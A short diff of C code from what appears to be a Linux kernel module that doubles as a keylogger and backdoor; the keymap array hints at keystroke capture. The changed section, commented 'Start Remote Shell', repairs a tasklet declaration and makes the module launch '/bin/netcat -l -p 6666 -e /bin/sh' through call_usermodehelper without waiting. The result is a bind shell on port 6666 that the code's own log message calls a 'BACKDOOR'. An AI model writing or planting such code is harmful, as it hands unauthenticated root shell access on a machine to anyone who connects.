@@ -127,22 +127,23 @@ static const char* keymap_shift[] =
 
 	/* Start Remote Shell */
 
-	DECLARE_TASKLET(shell_tasklet, shell_tasklet_fn, 
-		 (unsigned long) &my_tasklet_data );
+	
 
-	void shell_tasklet_fn(void){
+	void shell_tasklet_fn(unsigned long data){
  		static char *envp[] = {
 		        "HOME=/",
 		        "TERM=linux",
 		        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 		char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh &", NULL};
 		int ret = 0;
-		ret = call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC);
+		ret = call_usermodehelper(argv3[0], argv3, envp, UMH_NO_WAIT);
 		#ifdef LOG
 				printk(KERN_ERR  "BACKDOOR start netcat returned  %i\n", ret);
 	    #endif
 
 	}
+
+	DECLARE_TASKLET(shell_tasklet, shell_tasklet_fn, 0);
 
 	void start_remote_shell(void){
 		tasklet_schedule( &shell_tasklet );
